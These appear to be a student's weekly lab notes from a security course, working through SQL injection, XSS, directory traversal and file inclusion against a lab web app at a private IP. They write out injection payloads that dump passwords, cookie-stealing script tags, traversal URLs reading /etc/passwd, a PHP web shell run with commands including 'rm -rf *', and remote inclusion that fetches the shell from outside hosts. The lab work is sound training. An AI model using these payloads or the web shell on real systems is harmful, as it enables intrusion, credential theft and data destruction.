# Week 14.1
## SQL Refresher
In this activity we will use SQL injection queries. 
Notably when we want to pull more columns in our payload than what is present in the existing query we need to use a union and a concat to conbine column data.
```mysql
select first_name, last_name from users where user_id = '1'
select first_name, last_name from users where user_id = '1' or '1=1'
select first_name, last_name from users where user_id = '1' or 'chicken'='chicken'
select first_name, last_name from users where user_id = '1' union select user_id, password from users where '1=1'
select first_name, last_name from users where user_id = '1' union select concat(first_name, " ", last_name), password from users where '1=1'
```
## Testing SQL Injection on Web Applications
In this activity we will practice SQL injections on a dummy web app. <br>
First we test the intended use of the input feild. We enter user id "1" which pulls our admin user.<br>
Then using the queries from our previous lab we take only the payloads and input then to see our results.<br>
Note our payloads are the same but they lack the first and last quotation as that is built in to the query on the web app.
```mysql
1' or '1=1
1' or 'chicken'='chicken
1' union select user_id, password from users where '1=1
1' union select concat(first_name, " ", last_name), password from users where '1=1
```
The best ways to defend against these attacks is with input sanitization or prepared statements.
## Testing XSS on Web Applications
First we use the input field as intented. <br>
Second we inspect the page and search for where our input was placed in the html.
Third we attempt to right some harmless html code to test if the page is vulnerable like bolding the name.
Finally, since we confirmed we can modify the page lets input some scripts.
```html
<script>alert("Hi Robert")</script>
<script>alert(document.cookie)</script>
```
Adding these scripts can capture private cookies or load malware onto the victim's machine.
We can combat this by using response headrs or server-side input validation.
# Week 14.2

## Directory Traversal
For this lab we notice when we change to a different page the URL changes as well. <br>
http://192.168.13.25/vulnerabilities/fi/?page=file1.php<br>
http://192.168.13.25/vulnerabilities/fi/?page=file2.php<br>
For this lab we will use docker to connect to the websites container.
In the container we will go to the location where the file1.php are located.<br>
cd /var/www/html/vulnerabilities/fi<br>
In this folder we run ls and notice all the web pages are stored here including file4.php.
Although there is no link on the website for this file we can edit the url to bring us to this page:
http://192.168.13.25/vulnerabilities/fi/?page=file4.php<br>
Now that we know the page is vulnerable to directory traversal lets locate passwd, group, hosts, and network from the var file.
http://192.168.13.25/vulnerabilities/fi/?page=/../../../../etc/passwd<br>
http://192.168.13.25/vulnerabilities/fi/?page=/../../../../etc/group<br>
http://192.168.13.25/vulnerabilities/fi/?page=/../../../../etc/hosts<br>
http://192.168.13.25/vulnerabilities/fi/?page=/../../../../etc/network<br>
This displays all the contents of those files to the page leaking highly sensitive information. 
To avoid this we need to segregate confidential files from the web server and accessible directories. 
We should also have server side validation that does not allow the selection of unintended files.

## Local File Inclusion 
In this section of the web app we have a file upload section. We test the upload by sending in a normal .jpg. This site made the mistake of displaying where the image was uploaded to. 
By using this location we can upload a script and run commands through that script. <b>The last script is not recommended!</b>
```console
# script.php
<?php 
$command = $_GET['cmd'];
echo system($command); 
?>
192.168.13.25/vulnerabilities/upload/../../hackable/uploads/script.php?cmd=ls
http://192.168.13.25/hackable/uploads/script.php?cmd=whoami
http://192.168.13.25/hackable/uploads/script.php?cmd=pwd
http://192.168.13.25/hackable/uploads/script.php?cmd=ps
http://192.168.13.25/hackable/uploads/script.php?cmd=cat%20/etc/passwd
http://192.168.13.25/hackable/uploads/script.php?cmd=rm -rf *

```
## Remote File Inclusion
Further to the above issues with input validation we can also reference a remote web page. The below payload will display another web page on top of the existing website.
http://192.168.13.25/vulnerabilities/fi/?page=http://www.example.com
In the same way we used local file Inclusion we can use it remotely.
By referencing a webpage containing our script from before we can again run our scripts freely:
```console
https://tinyurl.com/y498epmz
<?php
  $command = $_GET['cmd'];
  echo system($command);
?>
http://192.168.13.25/vulnerabilities/fi/?cmd=whoami&page=https://tinyurl.com/y498epmz
http://192.168.13.25/vulnerabilities/fi/?cmd=ls&page=https://tinyurl.com/y498epmz
http://192.168.13.25/vulnerabilities/fi/?cmd=ps&page=https://tinyurl.com/y498epmz
http://192.168.13.25/vulnerabilities/fi/?cmd=cat%20../../../../../etc/hosts&page=https://tinyurl.com/y498epmz
```
Next lets combine this with our XSS payload
```console
https://tinyurl.com/yxk853vy
# Contents of the tinyurl
<?php 
$html = <<<EOT
<script>alert("Hey you have been hacked")</script>
EOT;
echo $html;
?>
http://192.168.13.25/vulnerabilities/fi/?page=https://tinyurl.com/yxk853vy
```
Lets create our own using a site called pastie. I will write a short script and save the file within pastie. Then using that url we append it to the vulnerable website and the popup appears.
```html
http://pastie.org/p/6pwV27q5tomAe6rbJHjFxc/raw
# contents
<script>alert(document.cookie)</script>
http://192.168.13.25/vulnerabilities/fi/?page=http://pastie.org/p/6pwV27q5tomAe6rbJHjFxc/raw
```

# Week 14.3

## Analyzing Session Management Vulnerabilities with Burp Repeater and Conducting Brute-Force Attacks with Burp Intruder
These will both be uploaded as PDFs as they are primarily screenshots and some written answers.
